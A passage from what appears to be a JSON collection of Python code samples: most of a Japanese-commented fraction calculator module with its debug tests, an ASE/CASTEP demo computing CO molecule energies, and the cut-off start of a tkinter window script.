TSF_calc_NOZU in \"$\":\n                TSF_calcLim=TSF_calcLim\n            else:\n                TSF_calcLim=\"~\".join([TSF_calcLim,\"0\"])\n        if '~' in TSF_calcLim:\n            TSF_LimFirst,TSF_LimRest=TSF_calcLim.split('~')[0],TSF_calcLim.split('~')[-1]\n        else:\n            TSF_LimFirst,TSF_LimRest=TSF_calcLim,TSF_calcLim\n        TSF_calcQ=TSF_calc_NOZUs[TSF_calc_NOZU](TSF_calcSeq,TSF_LimFirst,TSF_LimRest)\n    TSF_calcA=TSF_calc_addition(TSF_calcQ)\n    return TSF_calcA\n    \ndef TSF_calc_addition(TSF_calcQ):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306e\u8db3\u3057\u7b97\u5f15\u304d\u7b97\u30fb\u6d88\u8cbb\u7a0e\u8a08\u7b97\u7b49\u3002\n    TSF_calcLN,TSF_calcLD=decimal.Decimal(0),decimal.Decimal(1)\n    TSF_calcQ=TSF_calcQ.replace('+','\\t+').replace('-','\\t-').replace('~','').replace(',','')\n    TSF_calcQsplits=TSF_calcQ.strip('\\t').split('\\t')\n    for TSF_calcQmulti in TSF_calcQsplits:\n        TSF_calcO=TSF_calcQmulti[0] if len(TSF_calcQmulti)>0 else '+'\n        TSF_calcO=TSF_calcO if not '%' in TSF_calcQmulti else '%'\n        TSF_calcR=TSF_calc_multiplication(TSF_calcQmulti.replace('%',''))\n        TSF_calcRN,TSF_calcRD=TSF_calcR.split('|')\n        if float(TSF_calcRD) == 0.0:\n            TSF_calcA=\"n|0\"\n            break\n        if TSF_calcO == '%':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(100)+TSF_calcLN*decimal.Decimal(TSF_calcRN)*TSF_calcLD\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(100)\n        else:  # TSF_calcO == '+' or TSF_calcO == '-':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(TSF_calcRD)+decimal.Decimal(TSF_calcRN)*TSF_calcLD\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n        try:\n            TSF_GCD=fractions.gcd(TSF_calcLN,TSF_calcLD)\n            TSF_calcLN=TSF_calcLN//TSF_GCD\n            TSF_calcLD=TSF_calcLD//TSF_GCD\n            if TSF_calcLD < 0: TSF_calcLN,TSF_calcLD=-TSF_calcLN,-TSF_calcLD\n            TSF_calcA=\"|\".join([str(TSF_calcLN),str(TSF_calcLD)])\n        except decimal.InvalidOperation:\n            TSF_calcA=\"n|0\"\n    if TSF_calcA != \"0|1\" and TSF_calcA != \"n|0\":\n        TSF_calcA=TSF_calcA.replace('-','m') if TSF_calcA.startswith(\"-\") else \"\".join([\"p\",str(TSF_calcA)])\n    return TSF_calcA\n\ndef TSF_calc_multiplication(TSF_calcQ):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306e\u639b\u3051\u7b97\u5272\u308a\u7b97\u7b49\u3002\u516c\u500d\u6570\u516c\u7d04\u6570\u3001\u6700\u5927\u5024\u6700\u5c0f\u5024\u3082\u6271\u3046\u3002\n    TSF_calcLN,TSF_calcLD=decimal.Decimal(1),decimal.Decimal(1)\n    TSF_calcQ=TSF_calcQ.replace('*',\"\\t*\").replace('/',\"\\t/\").replace('\\\\',\"\\t\\\\\").replace('#',\"\\t#\").replace('&',\"\\t&\")\n    TSF_calcQ=TSF_calcQ.replace('G',\"G\\t\").replace('g',\"g\\t\").replace('^',\"^\\t\").replace('l',\"l\\t\").replace('A',\"A\\t\").replace('a',\"a\\t\").replace('>',\">\\t\").replace('<',\"<\\t\")\n    TSF_calcQsplits=TSF_calcQ.replace(\"\\t\\t\",'\\t').strip('\\t').split('\\t')\n    for TSF_calcQmulti in TSF_calcQsplits:\n        TSF_calcO=TSF_calcQmulti[0] if len(TSF_calcQmulti)>0 else '*'\n        TSF_calcO=TSF_calcO if not 'G' in TSF_calcQmulti else 'G'\n        TSF_calcO=TSF_calcO if not 'g' in TSF_calcQmulti else 'g'\n        TSF_calcO=TSF_calcO if not '^' in TSF_calcQmulti else '^'\n        TSF_calcO=TSF_calcO if not 'l' in TSF_calcQmulti else 'l'\n        TSF_calcO=TSF_calcO if not 'A' in TSF_calcQmulti else 'A'\n        TSF_calcO=TSF_calcO if not 'a' in TSF_calcQmulti else 'a'\n        TSF_calcO=TSF_calcO if not '>' in TSF_calcQmulti else '>'\n        TSF_calcO=TSF_calcO if not '<' in TSF_calcQmulti else '<'\n        TSF_calcR=TSF_calc_fractalize(TSF_calcQmulti.lstrip('*/\\\\#').rstrip('Gg^lAa><').replace('&',''))\n        TSF_calcRN,TSF_calcRD=TSF_calcR.split('|')\n        if decimal.Decimal(TSF_calcRD) == 0:\n            TSF_calcA=\"n|0\"\n            break\n        if TSF_calcO == '/':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(TSF_calcRD)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRN)\n            if TSF_calcLD < 0: TSF_calcLN,TSF_calcLD=-TSF_calcLN,-TSF_calcLD\n        elif TSF_calcO == '\\\\':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(TSF_calcRD)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRN)\n            TSF_calcLN,TSF_calcLD=TSF_calcLN//TSF_calcLD,1\n            if TSF_calcLD < 0: TSF_calcLN,TSF_calcLD=-TSF_calcLN,-TSF_calcLD\n        elif TSF_calcO == '#':\n            if decimal.Decimal(TSF_calcRN) == 0:\n                TSF_calcLD=0\n                break\n#            TSF_calcLN=(TSF_calcLN*decimal.Decimal(TSF_calcRD))%(decimal.Decimal(TSF_calcRN)*TSF_calcLD)\n            TSF_calcLND=decimal.Decimal(TSF_calcLN)*decimal.Decimal(TSF_calcRD)\n            TSF_calcRND=decimal.Decimal(TSF_calcRN)*decimal.Decimal(TSF_calcLD)\n            TSF_calcLN=decimal.getcontext().abs(TSF_calcLND%TSF_calcRND)\n            if TSF_calcRND < 0:\n                TSF_calcLN=decimal.getcontext().abs(TSF_calcRND)-TSF_calcLN\n            TSF_calcLN=TSF_calcLN.copy_sign(TSF_calcLND)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n            if TSF_calcLD < 0: TSF_calcLN,TSF_calcLD=-TSF_calcLN,-TSF_calcLD\n        elif TSF_calcO == 'G':\n            TSF_calcLN=fractions.gcd(TSF_calcLN*decimal.Decimal(TSF_calcRD),decimal.Decimal(TSF_calcRN)*TSF_calcLD)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n        elif TSF_calcO == 'g':\n            TSF_calcLN=TSF_calc_LCM(TSF_calcLN*decimal.Decimal(TSF_calcRD),decimal.Decimal(TSF_calcRN)*TSF_calcLD)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n        elif TSF_calcO == '^':\n            try:\n                TSF_calcRND=decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD)\n                TSF_calcRND=\"|\".join([str(decimal.getcontext().power(TSF_calcLN,TSF_calcRND)),str(decimal.getcontext().power(TSF_calcLD,TSF_calcRND))])\n                TSF_calcLND=TSF_calc_fractalize(TSF_calcRND)\n                TSF_calcRN,TSF_calcRD=TSF_calcLND.replace('m','-').replace('p','').split('|')\n                TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcRN),decimal.Decimal(TSF_calcRD)\n            except decimal.InvalidOperation:\n                TSF_calcA=\"n|0\"\n                break\n        elif TSF_calcO == 'l':\n            TSF_calcA=\"\"\n            if TSF_calcLD == 1 and decimal.Decimal(TSF_calcRD) == 1:\n                TSF_calcLND=TSF_calcLN; TSF_calclogNL,TSF_calclogNR=0,decimal.Decimal(TSF_calcRN)\n                if TSF_calclogNR > 0:\n                    while decimal.getcontext().remainder(TSF_calcLND,TSF_calclogNR) == 0:\n                        TSF_calcLND=decimal.Decimal(decimal.getcontext().divide(TSF_calcLND,TSF_calclogNR)); TSF_calclogNL+=1\n                    if decimal.getcontext().power(TSF_calclogNR,TSF_calclogNL) == TSF_calcLN:\n                        TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calclogNL),decimal.Decimal(1)\n                        TSF_calcA=\"|\".join([str(TSF_calcLN),str(TSF_calcLD)])\n            if TSF_calcA == \"\":\n                try:\n                    TSF_calcLND=str(fractions.Fraction(decimal.getcontext().ln(TSF_calcLN/TSF_calcLD)/decimal.getcontext().ln(decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD))))\n                    if '/' in TSF_calcLND:\n                        TSF_calcLN,TSF_calcLD=TSF_calcLND.split('/'); TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLN),decimal.Decimal(TSF_calcLD)\n                    else:\n                        TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLND),decimal.Decimal(1)\n                except decimal.InvalidOperation:\n                    TSF_calcA=\"n|0\"\n                    break\n        elif TSF_calcO == 'A':\n            try:\n                TSF_calcLND=str(fractions.Fraction(math.atan2(TSF_calcLN/TSF_calcLD,decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD))))\n                if '/' in TSF_calcLND:\n                    TSF_calcLN,TSF_calcLD=TSF_calcLND.split('/'); TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLN),decimal.Decimal(TSF_calcLD)\n                else:\n                    TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLND),decimal.Decimal(1)\n            except decimal.InvalidOperation:\n                TSF_calcA=\"n|0\"\n                break\n        elif TSF_calcO == 'a':\n            try:\n                TSF_calcX,TSF_calcY=TSF_calcLN/TSF_calcLD,decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD)\n                TSF_calcLND=str(fractions.Fraction(decimal.getcontext().sqrt(decimal.getcontext().power(TSF_calcX,2)+decimal.getcontext().power(TSF_calcY,2))))\n                if '/' in TSF_calcLND:\n                    TSF_calcLN,TSF_calcLD=TSF_calcLND.split('/'); TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLN),decimal.Decimal(TSF_calcLD)\n                else:\n                    TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcLND),decimal.Decimal(1)\n            except decimal.InvalidOperation:\n                TSF_calcA=\"n|0\"\n                break\n        elif TSF_calcO == '>':\n            TSF_calcLND=decimal.Decimal(TSF_calcLN/TSF_calcLD)\n            TSF_calcRND=decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD)\n            if TSF_calcLND > TSF_calcRND:\n                TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcRN),decimal.Decimal(TSF_calcRD)\n        elif TSF_calcO == '<':\n            TSF_calcLND=decimal.Decimal(TSF_calcLN/TSF_calcLD)\n            TSF_calcRND=decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD)\n            if TSF_calcLND < TSF_calcRND:\n                TSF_calcLN,TSF_calcLD=decimal.Decimal(TSF_calcRN),decimal.Decimal(TSF_calcRD)\n        elif TSF_calcO == '&':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(TSF_calcRD)+decimal.Decimal(TSF_calcRN)*TSF_calcLD\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n        else:  # TSF_calcO == '`':\n            TSF_calcLN=TSF_calcLN*decimal.Decimal(TSF_calcRN)\n            TSF_calcLD=TSF_calcLD*decimal.Decimal(TSF_calcRD)\n        try:\n            if TSF_calcLD < 0: TSF_calcLN,TSF_calcLD=-TSF_calcLN,-TSF_calcLD\n            TSF_GCD=fractions.gcd(TSF_calcLN,TSF_calcLD)\n            TSF_calcLN=TSF_calcLN//TSF_GCD\n            TSF_calcLD=TSF_calcLD//TSF_GCD\n            TSF_calcA=\"|\".join([str(TSF_calcLN),str(TSF_calcLD)])\n        except decimal.InvalidOperation:\n            TSF_calcA=\"n|0\"\n    return TSF_calcA\n\nTSF_calc_SCTs=OrderedDict([\n    ('R',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(TSF_calcN/TSF_calcD).sqrt()))),\n    ('E',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(TSF_calcN/TSF_calcD).ln()))),\n    ('L',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(TSF_calcN/TSF_calcD).log10()))),\n    ('S',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.sin(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n    ('C',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.cos(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n    ('T',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.tan(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n    ('s',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.asin(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n    ('c',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.acos(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n    ('t',(lambda TSF_calcN,TSF_calcD:str(decimal.Decimal(math.atan(decimal.Decimal(TSF_calcN/TSF_calcD)))))),\n])\ndef TSF_calc_fractalize(TSF_calcQ):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306a\u306e\u3067\u5c0f\u6570\u3092\u5206\u6570\u306b\u3002\u3064\u3044\u3067\u306b\u5e73\u65b9\u6839\u3084\u4e09\u89d2\u95a2\u6570\u3082\u30020\u3067\u5272\u308b\u3001\u3082\u3057\u304f\u306f\u6841\u304c\u9650\u754c\u8d8a\u3048\u305f\u3068\u304d\u306a\u3069\u306f\u300cn|0\u300d\u3092\u8fd4\u3059\u3002\n    TSF_calcQ=TSF_calcQ.replace('/','|').rstrip('.').rstrip('+')\n    if not '|' in TSF_calcQ:\n        TSF_calcQ=\"|\".join([TSF_calcQ,\"1\"])\n    TSF_calcM=TSF_calcQ.count('m')+TSF_calcQ.count('-') if not '!' in TSF_calcQ else 0\n    TSF_calcQ=TSF_calcQ.replace('p','').replace('m','').replace('-','').replace('!','')\n    TSF_calc_SCTin=\"\"\n    for TSF_calcSCT in TSF_calc_SCTs.keys():\n        if TSF_calcSCT in TSF_calcQ:\n            TSF_calc_SCTin+=TSF_calcSCT\n            TSF_calcQ=TSF_calcQ.replace(TSF_calcSCT,'')\n    TSF_calcR=TSF_calcQ.split('|'); TSF_calcNs,TSF_calcDs=TSF_calcR[0],TSF_calcR[1:]\n    if len(TSF_calcNs) == 0: TSF_calcNs=\"0\"\n    if \"n\" in TSF_calcNs:\n        TSF_calcA=\"n|0\"\n    else:\n        try:\n            TSF_calcN=decimal.Decimal(TSF_calcNs)\n        except decimal.InvalidOperation:\n            TSF_calcN=decimal.Decimal(\"0\")\n        TSF_calcD=decimal.Decimal(\"1\")\n        for TSF_calcDmulti in TSF_calcDs:\n            if len(TSF_calcDmulti) == 0: TSF_calcDmulti=\"0\"\n            try:\n                TSF_calcD=TSF_calcD*decimal.Decimal(TSF_calcDmulti)\n            except decimal.InvalidOperation:\n                TSF_calcD=decimal.Decimal(\"0\")\n        if TSF_calcD != decimal.Decimal(\"0\"):\n            try:\n                TSF_GCD=fractions.gcd(TSF_calcN,TSF_calcD)\n                TSF_calcN=TSF_calcN//TSF_GCD\n                TSF_calcD=TSF_calcD//TSF_GCD\n                if TSF_calcM%2 != 0:\n                    TSF_calcN=-TSF_calcN\n                TSF_calcA=\"|\".join([str(TSF_calcN),str(TSF_calcD)])\n            except decimal.InvalidOperation:\n                TSF_calcA=\"n|0\"\n        else:\n            TSF_calcA=\"n|0\"\n    if TSF_calcA != \"n|0\":\n        if len(TSF_calc_SCTin) > 0:\n            for TSF_calcSCT in TSF_calc_SCTin:\n                try:\n                    TSF_calcA=TSF_calc_SCTs[TSF_calcSCT](TSF_calcN,TSF_calcD)\n                except ValueError:\n                    TSF_calcA=\"n|0\"\n                except decimal.InvalidOperation:\n                    TSF_calcA=\"n|0\"\n                TSF_calcA=TSF_calc_fractalize(TSF_calcA)\n    return TSF_calcA\n\ndef TSF_calc_LCM(TSF_calcN,TSF_calcD):    #TSF_doc:\u6700\u5c0f\u516c\u500d\u6570\u306e\u8a08\u7b97\u3002\n    return decimal.Decimal(TSF_calcN*TSF_calcD)//decimal.Decimal(fractions.gcd(TSF_calcN,TSF_calcD))\n\ndef TSF_calc_decimalizeDC(TSF_calcQ):    #TSF_doc:\u5206\u6570(\u304c\u5165\u529b\u3055\u308c\u3066\u308b\u3082\u306e\u3068\u4fe1\u7528\u3057\u3066)\u3092\u5909\u63db\u3057\u3066\u5c0f\u6570\u3092\u8fd4\u3059\u3002\u305f\u3060\u3057\u300cn|0\u300d\u306e\u6642\u306f\u300cn|0\u300d\u3092\u8fd4\u3059\u3002\n    TSF_calcRN,TSF_calcRD=TSF_calcQ.replace('m','-').replace('p','').split('|')\n    if float(TSF_calcRD) != 0.0:\n        TSF_calcA=str(decimal.Decimal(TSF_calcRN)/decimal.Decimal(TSF_calcRD))\n    else:\n        TSF_calcA=\"n|0\"\n    return TSF_calcA\n\ndef TSF_calc_decimalizeKN(TSF_calcQ):    #TSF_doc:\u5206\u6570(\u304c\u5165\u529b\u3055\u308c\u3066\u308b\u3082\u306e\u3068\u4fe1\u7528\u3057\u3066)\u3092\u5909\u63db\u3057\u30664\u6841\u6bce\u306b\u6f22\u5b57\u3067\u8fd4\u3059\u3002\u305f\u3060\u3057\u300cn|0\u300d\u306e\u6642\u306f\u300cn|0\u300d\u3092\u8fd4\u3059\u3002\n    TSF_calcF=\"\u30de\u30a4\u30ca\u30b9\" if TSF_calcQ.startswith('m') else \"\"\n    TSF_calcRN,TSF_calcRD=TSF_calcQ.replace('m','').replace('p','').split('|')\n    if float(TSF_calcRD) != 0.0:\n        TSF_calcA=\"\".join([TSF_calcF,TSF_calc_decimalizeKNcomma(TSF_calcRD),\"\u5206\u306e\",TSF_calc_decimalizeKNcomma(TSF_calcRN)])\n        TSF_calcA=TSF_calcA.replace(\"1\u5206\u306e\",'')\n    else:\n        TSF_calcA=\"n|0\"\n    TSF_calcA=TSF_calcA.replace('\u6052','\u6052\u6cb3\u6c99').replace('\u963f','\u963f\u50e7\u7947').replace('\u90a3','\u90a3\u7531\u4ed6').replace('\u601d','\u4e0d\u53ef\u601d\u8b70').replace('\u91cf','\u7121\u91cf\u5927\u6570')\n    return TSF_calcA\n\ndef TSF_calc_decimalizeKNcomma(TSF_calcQ):    #TSF_doc:\u6574\u6570\u30924\u6841\u3067\u533a\u5207\u3063\u3066\u6f22\u6570\u5b57\u3092\u4ed8\u3051\u308b\u3002\n    TSF_calcA=\"\"\n    TSF_calcO=decimal.Decimal(TSF_calcQ); TSF_calcK=TSF_calcO%decimal.Decimal(10000)\n    if TSF_calcK:\n        TSF_calcA=\"\".join([TSF_calcA,str(TSF_calcK)])\n    for TSF_okusenK in TSF_calc_okusenman:\n        TSF_calcO=TSF_calcO//decimal.Decimal(10000); TSF_calcK=TSF_calcO%decimal.Decimal(10000)\n        if TSF_calcK > decimal.Decimal(0):\n            TSF_calcA=\"\".join([str(TSF_calcK),TSF_okusenK,TSF_calcA])\n    if TSF_calcO > decimal.Decimal(10000):\n        TSF_calcO=TSF_calcO//decimal.Decimal(10000)\n        TSF_calcA=\"\".join([str(TSF_calcO),TSF_calcA])\n    return TSF_calcA\n\n\ndef TSF_calc_debug():    #TSF_doc:\u300cTSF/TSF_calc.py\u300d\u5358\u4f53\u30c6\u30b9\u30c8\u98a8\u30c7\u30d0\u30c3\u30b0\u95a2\u6570\u3002\n    TSF_debug_log=\"\"\n    TSF_Forth_init(TSF_argvs,[TSF_calc_Initwords])\n    TSF_Forth_setTSF(TSF_Forth_1ststack(),\"\\t\".join([\"UTF-8\",\"#TSF_encoding\",\"10\",\"#TSF_calcPR\",\"TSF_calctest:\",\"#TSF_this\",\"0\",\"#TSF_fin.\"]))\n    TSF_Forth_setTSF(\"TSF_calc.py:\",\"\\t\".join([\"Python{0.major}.{0.minor}.{0.micro}\".format(sys.version_info),sys.platform,TSF_io_stdout]))\n    TSF_Forth_setTSF(\"TSF_calctest:\",\"\\t\".join([\"TSF_calc\u6f22\u6570\u5b57:\",\"#TSF_that\",\"\u4e00\u5272\u308b\u4e09\u5f15\u304f(\u30de\u30a4\u30ca\u30b9\u4e8c\u5206\u306e\u4e00)\",\"#TSF_calcFX\"]))\n    TSF_Forth_addfin(TSF_argvs)\n    TSF_Forth_run()\n    for TSF_thename in TSF_Forth_stackskeys():\n        TSF_debug_log=TSF_Forth_view(TSF_thename,True,TSF_debug_log)\n    TSF_debug_log=TSF_io_printlog(\"#--- OrderedDict ---\",TSF_debug_log)\n    LTsv_calcQlist=OrderedDict([\n        (\"TSF_calc\u6f22\u6570\u5b57:\",[\"\u4e00\u5272\u308b\u4e09\u5f15\u304f(\u30de\u30a4\u30ca\u30b9\u4e8c\u5206\u306e\u4e00)\",\"2\u5206\u306e1\u30925\u4e57\",\"(2\u5206\u306e1)\u30925\u4e57\",\"2\u5206\u306e(1\u30925\u4e57)\",\"(100\u5206\u306e1)\u30925\u4e57\",\"(8\u4e07\u5206\u306e1)\u30925\u4e57\",\"(478\u4e07\u5206\u306e1)\u30925\u4e57\",\"\u5104\",\"\u4e8c\u767e\u4e07\u5186\",\"\u5341\u5104\u767e\u4e8c\u5341\u5186\",\"\u5341\u5104\u3068\u98db\u3093\u3067\u767e\u4e8c\u5341\u5186\",\"\u767e\u4e8c\u5341\u5186\",\"3.14\",\"\u5186\u5468\u7387\",\"\u30cd\u30a4\u30d4\u30a2\u6570\",\"\u221e\",\"\u221a\uff12\",\"\u221am2\",\"\uff12\u306e\u5e73\u65b9\u6839\",\"256\u3092\u4e8c\u9032\u5bfe\u6570\",\"\uff12\u309216\u4e57\",\"\u7121\u91cf\u5927\u6570\"]),\n        (\"TSF_calc\u5c0f\u6570\u5206\u6570\u30d1\u30fc\u30bb\u30f3\u30c8:\",[\"0.5|3.5\",\"0.5/3.5\",\"1|2/7|2\",\"2|3|5|7\",\"0/100\",\"100/0\",\"10000+%8\", \"10000-5%\",\"7\\\\3\",\"3.14\\\\1\",\"9#6\",\"3|2#1|3\",\"-6\",\"m6\",\"-m6\",\"-6!\",\"m6!\",\"-m6!\"]),\n        (\"TSF_calc\u30bc\u30ed\u6bd4\u8f03\u6f14\u7b97\u5b50(\u4e09\u9805\u6f14\u7b97\u5b50):\",[\"m1Z1|1~0|1\",\"0Z1|1~0|1\",\"p1Z1|1~0|1\",\"m1z1|1~0|1\",\"0z1|1~0|1\",\"p1z1|1~0|1\"]),\n        (\"TSF_calc\u30bc\u30ed\u4ee5\u4e0a\u6f14\u7b97\u5b50(\u4e09\u9805\u6f14\u7b97\u5b50):\",[\"m1O1|1~0|1\",\"0O1|1~0|1\",\"p1O1|1~0|1\",\"m1o1|1~0|1\",\"0o1|1~0|1\",\"p1o1|1~0|1\"]),\n        (\"TSF_calc\u30bc\u30ed\u4ee5\u4e0b\u6f14\u7b97\u5b50(\u4e09\u9805\u6f14\u7b97\u5b50):\",[\"m1U1|1~0|1\",\"0U1|1~0|1\",\"p1U1|1~0|1\",\"m1u1|1~0|1\",\"0u1|1~0|1\",\"p1u1|1~0|1\"]),\n        (\"TSF_calc\u30bc\u30ed\u9664\u7b97\u6f14\u7b97\u5b50(\u4e09\u9805\u6f14\u7b97\u5b50):\",[\"n|0N1|1~0|1\",\"0/1N1|1~0|1\",\"1/0N1|1~0|1\",\"1/0?1|1~0|1\",\"n|0Z1|1~0|1\",\"n|0z1|1~0|1\",\"n|0O1|1~0|1\",\"n|0o1|1~0|1\",\"n|0U1|1~0|1\",\"n|0u1|1~0|1\"]),\n        (\"TSF_calc max,min:\",[\"0&0<\",\"0&1<\",\"1&0<\",\"1&1<\",\"0&0>\",\"0&1>\",\"1&0>\",\"1&1>\"]),\n        (\"TSF_calc\u5e73\u65b9\u6839atan2:\",[\"\u221a\uff12\",\"0&m9a\",\"0&m9a\",\"m9&m9A\",\"m9&m9a\",\"m9&0A\",\"m9&0a\",\"0&9A\",\"0&9a\",\"9&9A\",\"9&9a\",\"9&0A\",\"9&0a\",\"9&m9A\",\"9&m9a\",\"0&m9A\",\"0&0A\",\"0&0a\"]),\n        (\"TSF_calc\u5bfe\u6570\u4e57\u6570:\",[\"E1\",\"E2\",\"Ee\",\"E0\",\"L10000\",\"L256\",\"E256/E2\",\"L256/L2\",\"E256+L256\",\"256&2l\",\"254&2l\",\"10000&10l\",\"81&3l\",\"E(256-2)\",\"E(254)\",\"2&16^\",\"2&1|2^\",\"2&0^\",\"2&0|0^\",\"0&0^\",\"2&2^+3&2^\"]),\n        (\"TSF_calc\u5186\u5468\u7387:\",[\"y\",\"Y\",\"\u03c0\",\"\u03b8\",\"\u03b8|2\",\"\u03b8*30|360\",\"\u03b8/360*30\",\"30|360*\u03b8\",\"S(\u03b8*30|360)\",\"S(Y/360*30)\"]),\n        (\"TSF_calc\u4e09\u89d2\u95a2\u6570sincostan:\",[\"sin(\u03b8*0|360)\",\"S(\u03b8*30|360)\",\"S(\u03b8*60|360)\",\"S(\u03b8*90|360)\",\"cos(\u03b8*0|360)\",\"C(\u03b8*30|360)\",\"C(\u03b8*60|360)\",\"C(\u03b8*90|360)\",\"tan(\u03b8*0|360)\",\"T(\u03b8*30|360)\",\"T(\u03b8*60|360)\",\"T(\u03b8*90|360)\"]),\n        (\"TSF_calc\u548c\u6570\u5217\u7a4d\u6570\u5217:\",[\"kM7\",\"kM5~10\",\"kM10~0\",\"kP7\",\"kP5~10\",\"kP10~0\",\"kP10~2\",\"kM100\",\"kP1~10\",\"2P16\"]),\n        (\"TSF_calc\u516c\u7d04\u6570\u516c\u500d\u6570:\",[\"12&16G\",\"12\u306816\u306e\u516c\u7d04\u6570\",\"12\u306816\u306e\u6700\u5927\u516c\u7d04\u6570\",\"12&16g\",\"12\u306816\u306e\u516c\u500d\u6570\",\"12\u306816\u306e\u6700\u5c0f\u516c\u500d\u6570\"]),\n        (\"TSF_calc\u51aa\u4e57\u30e2\u30b8\u30e5\u30ed(\u7d20\u6570\u30d5\u30a7\u30eb\u30de\u30fc\u30c6\u30b9\u30c8):\",[\"2F0~0\",\"3F0~0\",\"2F7~7\",\"3F7~7\",\"2F60~60\",\"3F60~60\",\"2F341~341\",\"3F341~341\",\"2F561~561\",\"3F561~561\"]),\n    ])\n    for TSF_QlistK,TSF_QlistV in iter(LTsv_calcQlist.items()):\n        TSF_debug_log=TSF_io_printlog(\"#{0}\".format(TSF_QlistK),TSF_log=TSF_debug_log)\n        for LTsv_calcQ in TSF_QlistV:\n            TSF_debug_log=TSF_io_printlog(\"#\\t{0}\u21d4{1};{2};{3}\".format(LTsv_calcQ,TSF_calc(LTsv_calcQ,True),TSF_calc_decimalizeDC(TSF_calc(LTsv_calcQ,True)),TSF_calc_decimalizeKN(TSF_calc(LTsv_calcQ,True))),TSF_debug_log)\n    return TSF_debug_log\n\nif __name__==\"__main__\":\n    print(\"\")\n    TSF_argvs=TSF_io_argvs()\n    print(\"--- {0} ---\".format(TSF_argvs[0]))\n    TSF_debug_savefilename=\"debug/debug_calc.log\"\n    TSF_debug_log=TSF_calc_debug()\n    TSF_io_savetext(TSF_debug_savefilename,TSF_debug_log)\n    print(\"\")\n    try:\n        print(\"--- {0} ---\\n{1}\".format(TSF_debug_savefilename,TSF_debug_log))\n    except:\n        print(\"can't 'print(TSF_debug_savefilename,TSF_debug_log)'\")\n    finally:\n        pass\n    sys.exit()\n\n\n", "218": "\"\"\"This simple demo calculates the total energy of CO molecules\nusing once LDA and once PBE as xc-functional. Obviously\nsome parts in this scripts are longer than necessary, but are shown\nto demonstrate some more features.\"\"\"\n\nimport ase\nimport ase.calculators.castep\nimport ase.io.castep\n\ncalc = ase.calculators.castep.Castep()\ndirectory = 'CASTEP_ASE_DEMO'\n\n# include interface settings in .param file\ncalc._export_settings = True\n\n# reuse the same directory\ncalc._directory = directory\ncalc._rename_existing_dir = False\ncalc._label = 'CO_LDA'\n\n# necessary for tasks with changing positions\n# such as GeometryOptimization or MolecularDynamics\ncalc._set_atoms = True\n\n# Param settings\ncalc.param.xc_functional = 'LDA'\ncalc.param.cut_off_energy = 400\n# Prevent CASTEP from writing *wvfn* files\ncalc.param.num_dump_cycles = 0\n\n# Cell settings\ncalc.cell.kpoint_mp_grid = '1 1 1'\ncalc.cell.fix_com = False\ncalc.cell.fix_all_cell = True\n\n# Set and clear and reset settings (just for shows)\ncalc.param.task = 'SinglePoint'\n# Reset to CASTEP default\ncalc.param.task.clear()\n\n# all of the following are identical\ncalc.param.task = 'GeometryOptimization'\ncalc.task = 'GeometryOptimization'\ncalc.TASK = 'GeometryOptimization'\ncalc.Task = 'GeometryOptimization'\n\n\n# Prepare atoms\nmol = ase.atoms.Atoms('CO', [[0, 0, 0], [0, 0, 1.2]], cell=[10, 10, 10])\nmol.set_calculator(calc)\n\n# Check for correct input\nif calc.dryrun_ok():\n    print('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\nelse:\n    print(\"Found error in input\")\n    print(calc._error)\n\n\n# Read all settings from previous calculation\nmol = ase.io.castep.read_seed('%s/CO_LDA' % directory)\n\n# Use the OTF pseudo-potential we have just generated\nmol.calc.set_pspot('OTF')\n\n# Change some settings\nmol.calc.param.xc_functional = 'PBE'\n# don't forget to set an appropriate label\nmol.calc._label = 'CO_PBE'\n# Recalculate the potential energy\nprint('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\n", "219": "import tkinter as tk\n\nroot = tk.Tk()\nrootx = 800\nrooty = 500\nroot.geometry(f'{rootx}x{rooty}')\nroot.resizable(width=False, height=False)\n\nCharacterXY = [2, 2]\nAngleXY = ['90 degrees', '90 